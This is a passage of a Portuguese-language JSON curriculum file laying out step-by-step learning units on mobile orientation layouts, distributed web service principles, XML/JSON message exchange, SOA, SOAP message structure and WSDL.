                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "Dispositivo real ou emulador avançado",
                                    "Ferramentas de inspeção touch (DevTools)"
                                  ],
                                  "tips": "Siga guidelines Apple/Human Interface (44px min); use rem/em para escalabilidade.",
                                  "learningObjective": "Adaptar elementos interativos para usabilidade ótima em orientações móveis.",
                                  "commonMistakes": [
                                    "Botões pequenos em portrait",
                                    "Conteúdo cortado em landscape",
                                    "Ignorar zoom/pinch gestures"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Debugar e Otimizar Performance",
                                  "subSteps": [
                                    "Teste em múltiplos emuladores (iPhone, Android variados).",
                                    "Use Lighthouse no DevTools para performance mobile.",
                                    "Debug erros comuns como falsos positivos em eventos.",
                                    "Otimize: evite reflows desnecessários, use requestAnimationFrame.",
                                    "Documente código com comentários sobre orientações."
                                  ],
                                  "verification": "Sem erros no console ao rotacionar 10x; scores Lighthouse >90 em Performance.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Chrome DevTools Lighthouse",
                                    "Emuladores (BrowserStack ou locais)",
                                    "Dispositivo físico"
                                  ],
                                  "tips": "Grave vídeo de teste rotacionando; compare antes/depois.",
                                  "learningObjective": "Garantir robustez e performance em cenários reais de uso mobile.",
                                  "commonMistakes": [
                                    "Testar só em desktop",
                                    "Ignorar bateria/CPU em dispositivos reais",
                                    "Não limpar eventos no unload"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um app de lista de tarefas mobile: em portrait, lista vertical com botões grandes na base; em landscape, lista horizontal com filtros laterais e botões compactos no topo. Rotacione para ver alternância suave.",
                              "finalVerifications": [
                                "Layout alterna instantaneamente sem flicker ao rotacionar.",
                                "Botões e conteúdo se adaptam sem overflow ou corte.",
                                "Funciona offline e em modo avião.",
                                "Sem erros JS no console em 5+ dispositivos simulados.",
                                "Transições suaves (<300ms) sem lag perceptível.",
                                "Suporte a zoom e gestos touch preservado."
                              ],
                              "assessmentCriteria": [
                                "Media queries CSS funcionam independentemente de JS.",
                                "Eventos JS detectam e respondem corretamente a mudanças.",
                                "UI otimizada para touch (tamanhos, espaçamento).",
                                "Código modular, comentado e sem warnings.",
                                "Performance mobile audit passa (Lighthouse score alto).",
                                "Compatibilidade cross-browser (Chrome, Safari, Firefox mobile)."
                              ],
                              "crossCurricularConnections": [
                                "Design de UX/UI: Princípios de responsividade e mobile-first.",
                                "Matemática Computacional: Cálculos de viewport e proporções dinâmicas.",
                                "Desenvolvimento Web Geral: Integração CSS/JS avançada.",
                                "Acessibilidade: ARIA labels adaptáveis por orientação.",
                                "Engenharia de Software: Testes unitários para eventos de orientação."
                              ],
                              "realWorldApplication": "Aplicativos como jogos mobile (ex: Candy Crush, full-screen landscape), e-readers (portrait para texto, landscape para imagens) ou dashboards de delivery (portrait para lista, landscape para mapa expandido), melhorando engajamento e usabilidade em dispositivos rotacionáveis."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.5.3.3"
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.3",
                "name": "Desenvolvimento de serviços para a Internet",
                "description": "Foca na criação de serviços web e APIs que suportam aplicações distribuídas na Internet.",
                "totalSkills": 45,
                "atomicTopics": [
                  {
                    "id": "10.1.3.1",
                    "name": "Arquitetura de Serviços Web",
                    "description": "Conceitos fundamentais de arquiteturas como REST e SOAP para serviços distribuídos na Internet.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.1.1",
                        "name": "Conceitos Fundamentais de Serviços Web Distribuídos",
                        "description": "Introdução aos princípios básicos de serviços web distribuídos na Internet, incluindo comunicação cliente-servidor, interoperabilidade e padrões para troca de mensagens em ambientes heterogêneos.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.1.1",
                            "name": "Identificar princípios de serviços distribuídos",
                            "description": "Explicar os conceitos de statelessness, escalabilidade e interoperabilidade em serviços web, com exemplos de como eles suportam aplicações na Internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Princípio de Statelessness",
                                  "subSteps": [
                                    "Defina statelessness: um serviço que não retém informações de estado entre requisições sucessivas do cliente.",
                                    "Compare com stateful: em stateful, o servidor mantém sessão; em stateless, cada requisição é independente e contém todos os dados necessários.",
                                    "Analise exemplos: protocolos HTTP são inerentemente stateless; cookies ou tokens JWT gerenciam estado no cliente.",
                                    "Identifique vantagens: facilita replicação de servidores e depuração, pois não há dependência de estado compartilhado.",
                                    "Pratique identificando statelessness em uma API REST simples."
                                  ],
                                  "verification": "Escreva uma definição em suas palavras e forneça um exemplo de requisição stateless, explicando por que ela é independente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial do HTTP/1.1 (RFC 2616)",
                                    "Artigo 'RESTful APIs: Statelessness Explained' no Medium"
                                  ],
                                  "tips": "Sempre inclua dados necessários na requisição para simular independência total.",
                                  "learningObjective": "Dominar o conceito de statelessness e sua importância para serviços web distribuídos.",
                                  "commonMistakes": "Confundir statelessness com ausência total de estado (o estado pode ser no cliente via tokens); assumir que sessões de usuário violam statelessness."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Escalabilidade em Serviços Distribuídos",
                                  "subSteps": [
                                    "Defina escalabilidade: capacidade de um sistema lidar com aumento de carga adicionando recursos sem downtime.",
                                    "Diferencie escalabilidade horizontal (mais instâncias) de vertical (mais poder em uma máquina).",
                                    "Explique como statelessness habilita escalabilidade horizontal: qualquer instância pode processar qualquer requisição.",
                                    "Estude componentes: load balancers distribuem tráfego; auto-scaling groups em clouds como AWS.",
                                    "Simule um cenário: adicione réplicas a um serviço web e observe distribuição de requisições."
                                  ],
                                  "verification": "Desenhe um diagrama mostrando um load balancer distribuindo tráfego para 3 instâncias stateless de um serviço.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Vídeo 'Horizontal Scaling Explained' no YouTube (freeCodeCamp)",
                                    "Documentação AWS Auto Scaling"
                                  ],
                                  "tips": "Priorize statelessness desde o design para escalar facilmente sem sincronização de estado.",
                                  "learningObjective": "Entender mecanismos de escalabilidade e sua dependência em statelessness.",
                                  "commonMistakes": "Ignorar gargalos de banco de dados compartilhado; confundir escalabilidade com performance de uma única instância."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Interoperabilidade em Serviços Web",
                                  "subSteps": [
                                    "Defina interoperabilidade: habilidade de serviços heterogêneos se comunicarem usando padrões comuns.",
                                    "Liste padrões chave: REST com JSON/XML, SOAP com WSDL, gRPC para alta performance.",
                                    "Examine formatos de dados: JSON para simplicidade cross-language; esquemas abertos como OpenAPI.",
                                    "Discuta exemplos: um serviço Java consumindo API Python via HTTP/REST.",
                                    "Avalie benefícios: permite composições em ecossistemas distribuídos como microsserviços."
                                  ],
                                  "verification": "Liste 3 protocolos/padrões interoperáveis e descreva como eles facilitam comunicação entre linguagens diferentes.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Especificação OpenAPI 3.0",
                                    "Tutorial 'REST vs SOAP' no Baeldung"
                                  ],
                                  "tips": "Use JSON como payload padrão para máxima compatibilidade entre linguagens.",
                                  "learningObjective": "Identificar padrões que garantem interoperabilidade em serviços distribuídos.",
                                  "commonMistakes": "Assumir que qualquer API HTTP é interoperável (sem padrões, falha); ignorar versionamento de APIs."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Princípios com Exemplos em Aplicações Internet",
                                  "subSteps": [
                                    "Revise os três princípios: statelessness, escalabilidade e interoperabilidade.",
                                    "Analise caso real: Netflix usa microsserviços stateless escaláveis via REST/gRPC para streaming global.",
                                    "Construa exemplo: serviço de autenticação stateless (JWT) interoperável com frontends web/mobile.",
                                    "Discuta suporte a apps internet: alta disponibilidade para picos de tráfego em e-commerces.",
                                    "Crie um fluxograma combinando os princípios em uma arquitetura distribuída."
                                  ],
                                  "verification": "Desenvolva um exemplo fictício de serviço web que incorpore os três princípios e explique seu suporte a apps escaláveis.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Case study 'Netflix Microservices Architecture' no Netflix Tech Blog",
                                    "Ferramenta Draw.io para diagramas"
                                  ],
                                  "tips": "Pense em arquiteturas cloud-native como Kubernetes para visualizar integrações.",
                                  "learningObjective": "Aplicar os princípios de forma integrada a cenários reais de internet.",
                                  "commonMistakes": "Isolar conceitos sem mostrar interdependências; subestimar impacto de estado local em escalabilidade."
                                }
                              ],
                              "practicalExample": "Crie um serviço REST stateless para consulta de produtos em um e-commerce: cada GET /produtos/{id} inclui token JWT no header (sem estado no servidor), deploy em múltiplas instâncias com load balancer para escalar durante Black Friday, e consumido por apps web (React) e mobile (Flutter) via JSON interoperável.",
                              "finalVerifications": [
                                "Explicar statelessness com um exemplo de requisição HTTP completa.",
                                "Desenhar diagrama de escalabilidade horizontal para um serviço web.",
                                "Identificar padrões interoperáveis em uma API real (ex: GitHub API).",
                                "Combinar os três princípios em um caso de uso de app internet.",
                                "Discutir limitações e soluções para violações de princípios."
                              ],
                              "assessmentCriteria": [
                                "Precisão e profundidade conceitual (30%)",
                                "Relevância e qualidade de exemplos práticos (25%)",
                                "Demonstração de interconexões entre princípios (20%)",
                                "Clareza e estrutura na explicação (15%)",
                                "Criatividade em aplicações reais (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP e balanceamento de carga.",
                                "Banco de Dados: Armazenamento distribuído sem estado compartilhado (ex: DynamoDB).",
                                "Segurança da Informação: Tokens stateless como JWT para autenticação.",
                                "Engenharia de Software: Padrões de design para microsserviços."
                              ],
                              "realWorldApplication": "Plataformas como Amazon Web Services usam esses princípios em Lambda e ECS para serviços serverless escaláveis, suportando bilhões de requisições diárias em apps como o site da Amazon, onde statelessness permite auto-scaling instantâneo e interoperabilidade integra pagamentos, estoque e recomendações de múltiplos vendors."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.2",
                            "name": "Compreender troca de mensagens em serviços web",
                            "description": "Descrever os mecanismos de request-response e padrões como XML e JSON para formatação de dados em comunicações distribuídas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o modelo Request-Response",
                                  "subSteps": [
                                    "Definir o conceito de requisição (request) como a mensagem enviada pelo cliente ao servidor solicitando uma ação ou recurso.",
                                    "Explicar a resposta (response) como a mensagem retornada pelo servidor com os dados solicitados ou status da operação.",
                                    "Descrever o fluxo completo: cliente inicia request → servidor processa → servidor envia response → cliente interpreta.",
                                    "Identificar componentes chave: headers, body, status codes (ex: 200 OK, 404 Not Found).",
                                    "Simular um exemplo simples usando um browser para acessar uma página web."
                                  ],
                                  "verification": "Criar um diagrama ilustrando o ciclo request-response com rótulos para cada etapa.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Ferramenta de diagrama como Draw.io ou papel e caneta",
                                    "Documentação HTTP basics (MDN Web Docs)"
                                  ],
                                  "tips": "Use o DevTools do navegador (F12) para inspecionar requests reais em sites como google.com.",
                                  "learningObjective": "Dominar o ciclo fundamental de comunicação cliente-servidor em serviços web.",
                                  "commonMistakes": "Confundir request com response ou ignorar o papel dos status codes na interpretação da resposta."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar XML como padrão de formatação de dados",
                                  "subSteps": [
                                    "Entender a estrutura hierárquica do XML: tags de abertura/fechamento, elementos raiz e aninhados.",
                                    "Identificar atributos e namespaces para organização de dados em comunicações distribuídas.",
                                    "Criar um exemplo XML simples representando dados de um usuário (nome, email, endereço).",
                                    "Analisar vantagens do XML: legibilidade humana, suporte a esquemas (XSD) para validação.",
                                    "Comparar com formatação textual simples, destacando suporte a estruturas complexas."
                                  ],
                                  "verification": "Validar um XML criado usando um validador online e explicar sua estrutura em voz alta.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code)",
                                    "Validador XML online (xmlvalidation.com)",
                                    "Exemplos de SOAP XML (w3schools.com)"
                                  ],
                                  "tips": "Sempre feche tags corretamente para evitar erros de parsing; use indentação para legibilidade.",
                                  "learningObjective": "Capacitar-se a formatar e interpretar dados XML em trocas de mensagens web.",
                                  "commonMistakes": "Esquecer de fechar tags ou usar caracteres especiais sem escaping (ex: & como &amp;)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar JSON como padrão de formatação de dados",
                                  "subSteps": [
                                    "Definir JSON como formato leve baseado em chave-valor, arrays e objetos aninhados.",
                                    "Criar um exemplo JSON equivalente ao XML do passo anterior (usuário com nome, email, endereço).",
                                    "Destacar sintaxe: chaves duplas, aspas, vírgulas, e tipos suportados (string, number, boolean, null).",
                                    "Analisar vantagens: parsing nativo em JavaScript, menor overhead que XML, ideal para APIs REST.",
                                    "Converter manualmente dados de XML para JSON e vice-versa."
                                  ],
                                  "verification": "Usar um validador JSON online para testar o exemplo criado e compará-lo com o XML.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code com extensão JSON)",
                                    "Validador JSON (jsonlint.com)",
                                    "Documentação JSON.org"
                                  ],
                                  "tips": "Evite trailing commas no final de objetos/arrays; teste sempre com um validador para syntax errors.",
                                  "learningObjective": "Habilitar a criação e compreensão de JSON para comunicações eficientes em serviços web.",
                                  "commonMistakes": "Usar aspas simples em vez de duplas ou misturar tipos de dados incorretamente."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar conceitos em comunicações distribuídas",
                                  "subSteps": [
                                    "Explicar como request-response usa XML/JSON no body para trocas em serviços web distribuídos.",
                                    "Discutir padrões como SOAP (XML-heavy) vs REST (JSON-preferred) em arquiteturas distribuídas.",
                                    "Simular uma troca completa: enviar request JSON via ferramenta e analisar response.",
                                    "Identificar desafios: serialização, desserialização, segurança (HTTPS) e escalabilidade.",
                                    "Descrever o papel em sistemas distribuídos: microsserviços comunicando via APIs."
                                  ],
                                  "verification": "Redigir um parágrafo descrevendo uma troca completa usando JSON em um serviço web.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Postman ou curl",
                                    "API pública como JSONPlaceholder (jsonplaceholder.typicode.com)",
                                    "Documentação REST APIs"
                                  ],
                                  "tips": "Experimente com APIs reais para ver request-response em ação; foque em headers Content-Type.",
                                  "learningObjective": "Aplicar request-response com XML/JSON em contextos de serviços web distribuídos.",
                                  "commonMistakes": "Ignorar Content-Type header, levando a falhas de parsing no receptor."
                                }
                              ],
                              "practicalExample": "Usando Postman, envie uma GET request para https://jsonplaceholder.typicode.com/users/1. Analise o JSON na response: identifique o request (URL, método), o body JSON retornado (nome, email), e explique como isso exemplifica troca de mensagens em um serviço web distribuído, comparando com uma versão XML hipotética.",
                              "finalVerifications": [
                                "Descrever verbalmente o ciclo request-response com exemplos de status codes.",
                                "Criar e validar XML e JSON equivalentes para dados de um produto.",
                                "Simular uma request-response usando Postman e interpretar a formatação usada.",
                                "Comparar prós/contras de XML vs JSON em comunicações distribuídas.",
                                "Explicar o impacto de formatação inadequada em serviços web.",
                                "Identificar Content-Type em uma request real via DevTools."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na descrição do mecanismo request-response (80% cobertura).",
                                "Correção sintática em exemplos XML e JSON criados (sem erros de validação).",
                                "Capacidade de integrar conceitos em cenários distribuídos com exemplos relevantes.",
                                "Profundidade nas diferenças entre XML e JSON (legibilidade, performance, uso).",
                                "Clareza em diagramas e explicações verbais/escritas.",
                                "Demonstração prática via ferramenta como Postman (logs de request/response)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP/HTTPS e camadas OSI de aplicação.",
                                "Programação: Parsing de XML/JSON em linguagens como JavaScript (JSON.parse) ou Python (xml.etree).",
                                "Banco de Dados: Serialização de consultas/respostas em APIs relacionais/NoSQL.",
                                "Segurança da Informação: Autenticação em requests (OAuth, JWT em JSON)."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon, APIs REST usam JSON em requests para buscar produtos (ex: /api/products?category=eletronicos), com responses formatadas para exibição dinâmica, permitindo escalabilidade em microsserviços distribuídos globalmente."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.3",
                            "name": "Reconhecer arquiteturas orientadas a serviços",
                            "description": "Analisar como SOA (Service-Oriented Architecture) integra serviços web para desenvolvimento de aplicações modulares na Internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos básicos de SOA",
                                  "subSteps": [
                                    "Ler definição oficial de Service-Oriented Architecture (SOA).",
                                    "Diferenciar SOA de arquiteturas monolíticas.",
                                    "Identificar o foco em serviços reutilizáveis e modulares.",
                                    "Explorar o papel da Internet na integração de serviços web.",
                                    "Assistir vídeo introdutório sobre SOA (5-10 min)."
                                  ],
                                  "verification": "Resumir em 3 frases o que é SOA e sua diferença de monolítica.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Artigo da Wikipedia sobre SOA, vídeo no YouTube (ex: 'SOA Explained').",
                                  "tips": "Use analogias como 'lego' para serviços modulares.",
                                  "learningObjective": "Definir SOA e contextualizar no desenvolvimento web.",
                                  "commonMistakes": "Confundir SOA com microservices; SOA é mais ampla."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar princípios fundamentais da SOA",
                                  "subSteps": [
                                    "Listar os 4 princípios principais: padronização, loose coupling, reutilização e autonomia.",
                                    "Explicar 'loose coupling' com exemplo de serviços independentes.",
                                    "Analisar como a padronização (ex: SOAP/REST) facilita integração.",
                                    "Discutir autonomia de serviços e seu impacto na modularidade.",
                                    "Criar um mapa mental dos princípios."
                                  ],
                                  "verification": "Citar e exemplificar cada princípio em um parágrafo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Infográfico de princípios SOA, ferramenta de mindmap (ex: MindMeister).",
                                  "tips": "Relacione princípios a cenários reais para fixar.",
                                  "learningObjective": "Aplicar princípios SOA em descrições conceituais.",
                                  "commonMistakes": "Ignorar 'loose coupling', achando que serviços precisam ser fortemente acoplados."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar componentes chave de SOA",
                                  "subSteps": [
                                    "Descrever componentes: serviços, ESB (Enterprise Service Bus), registro de serviços (UDDI).",
                                    "Estudar protocolos: SOAP, WSDL, REST para serviços web.",
                                    "Desenhar diagrama simples de SOA com ESB central.",
                                    "Explorar orquestração vs. coreografia de serviços.",
                                    "Comparar com exemplos de integrações web."
                                  ],
                                  "verification": "Desenhar e legendário um diagrama de SOA com 5 componentes.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ferramenta de diagrama (ex: Draw.io), documentação SOAP/WSDL.",
                                  "tips": "Comece com REST se familiar, pois é mais simples que SOAP.",
                                  "learningObjective": "Reconhecer e diagramar componentes SOA.",
                                  "commonMistakes": "Confundir ESB com simples API gateway."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Reconhecer integrações modulares em SOA",
                                  "subSteps": [
                                    "Analisar caso de uso: e-commerce com serviços de pagamento, estoque e usuário.",
                                    "Identificar benefícios: escalabilidade, manutenção e reutilização.",
                                    "Discutir desafios: latência e governança de serviços.",
                                    "Simular integração verbal de 3 serviços web.",
                                    "Avaliar como SOA suporta aplicações Internet distribuídas."
                                  ],
                                  "verification": "Explicar como SOA integra 3 serviços em um app web.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Caso de estudo SOA (ex: Netflix ou Amazon), papel e caneta.",
                                  "tips": "Pense em fluxos reais para tornar abstrato concreto.",
                                  "learningObjective": "Analisar SOA em contextos modulares reais.",
                                  "commonMistakes": "Superestimar simplicidade, ignorando complexidade de segurança."
                                }
                              ],
                              "practicalExample": "Em um e-commerce como Magazine Luiza, o serviço de autenticação de usuário (login) é separado do serviço de processamento de pedidos e do serviço de consulta de estoque, permitindo que cada um seja atualizado independentemente via ESB, integrando via REST APIs na Internet.",
                              "finalVerifications": [
                                "Definir SOA e listar 3 componentes principais.",
                                "Explicar 2 princípios com exemplos.",
                                "Desenhar diagrama básico de SOA.",
                                "Identificar 2 benefícios e 1 desafio em aplicações web.",
                                "Comparar SOA com arquitetura monolítica.",
                                "Simular integração de 3 serviços web."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (25%): Definições corretas sem erros.",
                                "Profundidade de análise (25%): Exemplos e diagramas detalhados.",
                                "Compreensão de princípios (20%): Aplicação correta em cenários.",
                                "Criatividade em exemplos (15%): Práticos e relevantes.",
                                "Clareza na verificação (15%): Diagramas e resumos legíveis."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de comunicação (HTTP, SOAP).",
                                "Desenvolvimento Web: APIs REST e integração de serviços.",
                                "Gestão de Projetos: Modularidade e escalabilidade em TI.",
                                "Administração: Reutilização de serviços em negócios digitais."
                              ],
                              "realWorldApplication": "Empresas como bancos (ex: Itaú) usam SOA para integrar serviços de mobile banking, ATM e internet banking, permitindo atualizações independentes e alta disponibilidade na Internet."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.1.2",
                        "name": "Arquitetura SOAP",
                        "description": "Protocolo baseado em XML para serviços web, enfatizando mensagens estruturadas, contratos formais via WSDL e suporte a segurança avançada.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.2.1",
                            "name": "Descrever estrutura de mensagens SOAP",
                            "description": "Detalhar os elementos Envelope, Header, Body e Fault em uma mensagem SOAP, com exemplos de uso em serviços distribuídos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura geral da mensagem SOAP (Envelope)",
                                  "subSteps": [
                                    "Estudar a definição de SOAP como protocolo de mensagens baseado em XML para serviços web.",
                                    "Identificar o elemento raiz obrigatório <soap:Envelope> como container principal.",
                                    "Aprender os namespaces padrão (ex: xmlns:soap='http://www.w3.org/2003/05/soap-envelope').",
                                    "Visualizar a estrutura hierárquica básica de uma mensagem SOAP.",
                                    "Entender atributos opcionais como mustUnderstand e encodingStyle no Envelope."
                                  ],
                                  "verification": "Desenhar um diagrama simples da estrutura do Envelope e listar seus atributos principais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação oficial SOAP 1.2 (W3C)",
                                    "Editor XML como VS Code ou Notepad++"
                                  ],
                                  "tips": "Sempre inclua o namespace correto para evitar erros de validação em parsers XML.",
                                  "learningObjective": "Dominar o papel do Envelope como estrutura raiz de qualquer mensagem SOAP.",
                                  "commonMistakes": [
                                    "Esquecer o namespace soapenv",
                                    "Confundir Envelope com o payload do Body"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o elemento Header",
                                  "subSteps": [
                                    "Aprender que o Header é opcional e usado para metadados como autenticação ou transações.",
                                    "Estudar a inserção de elementos customizados dentro de <soap:Header>.",
                                    "Compreender o atributo mustUnderstand e suas implicações para processadores.",
                                    "Analisar exemplos de uso: tokens de sessão ou IDs de correlação.",
                                    "Verificar como Headers são processados independentemente do Body."
                                  ],
                                  "verification": "Criar um XML de Header com um elemento customizado e atributo mustUnderstand='1'.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplos de mensagens SOAP no site W3C",
                                    "Ferramenta online de validador XML"
                                  ],
                                  "tips": "Use Headers para informações não essenciais ao payload principal, mantendo o Body limpo.",
                                  "learningObjective": "Saber inserir e interpretar metadados no Header de forma correta.",
                                  "commonMistakes": [
                                    "Colocar dados de negócio no Header",
                                    "Ignorar o impacto do mustUnderstand"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detalhar o elemento Body",
                                  "subSteps": [
                                    "Entender o Body como o container obrigatório para o payload principal da mensagem.",
                                    "Diferenciar estilos de uso: Document/literal vs RPC/encoded.",
                                    "Criar exemplos de request (chamada de método) e response (retorno de dados).",
                                    "Estudar regras de encoding e múltiplos elementos filhos no Body.",
                                    "Validar a ausência de namespaces obrigatórios no Body (herda do Envelope)."
                                  ],
                                  "verification": "Montar um Body XML com uma operação de consulta e validar sua sintaxe.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "SoapUI ou Postman para testar Bodies",
                                    "Schemas XSD de exemplo SOAP"
                                  ],
                                  "tips": "Mantenha o Body focado apenas nos dados da operação para facilitar o parsing.",
                                  "learningObjective": "Construir e descrever o conteúdo principal de uma mensagem SOAP.",
                                  "commonMistakes": [
                                    "Misturar metadados no Body",
                                    "Usar encoding incompatível com o cliente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar o elemento Fault e compor mensagem completa",
                                  "subSteps": [
                                    "Estudar a estrutura do Fault: faultcode, faultstring, faultactor, detail e faultsubcode.",
                                    "Identificar tipos padrão de faultcodes (VersionMismatch, Sender, Receiver, etc.).",
                                    "Montar uma mensagem SOAP completa integrando Envelope, Header, Body e Fault.",
                                    "Testar cenários de erro em ferramentas como SoapUI.",
                                    "Aplicar em contexto de serviços distribuídos com exemplos reais."
                                  ],
                                  "verification": "Gerar uma mensagem Fault completa e explicar cada subelemento.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "SoapUI (ferramenta gratuita)",
                                    "Tutoriais W3Schools SOAP Faults"
                                  ],
                                  "tips": "Sempre inclua detalhes úteis no faultstring para depuração em produção.",
                                  "learningObjective": "Gerenciar erros e compor mensagens SOAP integrais.",
                                  "commonMistakes": [
                                    "Confundir Fault com Body normal",
                                    "Omitir faultcode obrigatório"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um serviço web de e-commerce, uma mensagem de request para obter preço de produto: <soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><auth:sessionId xmlns:auth=\"http://exemplo.com/auth\">sess-123</auth:sessionId></soap:Header><soap:Body><ns:getProductPrice xmlns:ns=\"http://exemplo.com/ecommerce\"><productId>456</productId></ns:getProductPrice></soap:Body></soap:Envelope>. Para erro: substitua Body por <soap:Fault><faultcode>soap:Sender</faultcode><faultstring>Produto inválido</faultstring><detail><invalidId>456</invalidId></detail></soap:Fault>.",
                              "finalVerifications": [
                                "Descrever com precisão os quatro elementos principais (Envelope, Header, Body, Fault)?",
                                "Montar uma mensagem SOAP básica válida em XML?",
                                "Explicar o atributo mustUnderstand e seu impacto?",
                                "Identificar diferenças entre Body request/response e Fault?",
                                "Validar namespaces e estrutura hierárquica em um exemplo?",
                                "Aplicar conceitos em um cenário de serviço distribuído?"
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na descrição de cada elemento SOAP.",
                                "Correto uso de terminologia XML, namespaces e atributos.",
                                "Qualidade e relevância dos exemplos práticos fornecidos.",
                                "Capacidade de diagramar ou codificar estruturas completas.",
                                "Compreensão de contextos de uso em serviços web distribuídos.",
                                "Identificação de erros comuns e Faults apropriados."
                              ],
                              "crossCurricularConnections": [
                                "XML e Schemas (fundamentos de estrutura de dados).",
                                "Redes e Protocolos de Transporte (HTTP/SOAP over HTTP).",
                                "Desenvolvimento Web (Integração de APIs legadas).",
                                "Segurança da Informação (Autenticação e WS-Security no Header).",
                                "Arquitetura de Software (Serviços distribuídos e SOA)."
                              ],
                              "realWorldApplication": "SOAP é amplamente usado em integrações empresariais críticas, como transações bancárias entre sistemas legados (ex: ERPs SAP com bancos), garantindo mensagens padronizadas, seguras e confiáveis em ambientes distribuídos com alto volume de trocas de dados."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.2.2",
                            "name": "Explicar WSDL em SOAP",
                            "description": "Interpretar o papel do WSDL (Web Services Description Language) como contrato de serviço, incluindo portas, operações e tipos de dados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito e Papel do WSDL como Contrato de Serviço",
                                  "subSteps": [
                                    "Defina WSDL como Web Services Description Language, uma linguagem baseada em XML para descrever serviços web.",
                                    "Explique que WSDL atua como um 'contrato' que define como clientes podem interagir com o serviço SOAP.",
                                    "Identifique os elementos principais: types, message, portType, binding, port e service.",
                                    "Discuta a importância da independência de linguagem e plataforma promovida pelo WSDL.",
                                    "Compare WSDL com um menu de restaurante, onde operações são pratos disponíveis."
                                  ],
                                  "verification": "Escreva uma definição de 100 palavras explicando o papel do WSDL e liste seus elementos principais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação oficial WSDL 1.1 ou 2.0",
                                    "Exemplo de arquivo WSDL simples"
                                  ],
                                  "tips": "Sempre pense no WSDL como uma interface pública, não na implementação interna.",
                                  "learningObjective": "Entender o WSDL como contrato formal para serviços SOAP.",
                                  "commonMistakes": [
                                    "Confundir WSDL com a implementação do serviço",
                                    "Ignorar que WSDL é agnóstico de linguagem"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Tipos de Dados e Mensagens no WSDL",
                                  "subSteps": [
                                    "Examine a seção <types> para definições de estruturas de dados usando XML Schema.",
                                    "Identifique elementos <message> que definem as entradas e saídas das operações.",
                                    "Mapeie tipos simples (string, int) e complexos (structs) para parâmetros de operações.",
                                    "Verifique como mensagens são compostas por parts referenciadas a tipos.",
                                    "Pratique parsing de um <types> e <message> em um WSDL real."
                                  ],
                                  "verification": "Desenhe um diagrama mostrando types e mensagens de um WSDL exemplo.",
                                  "estimatedTime": "25 minutos",
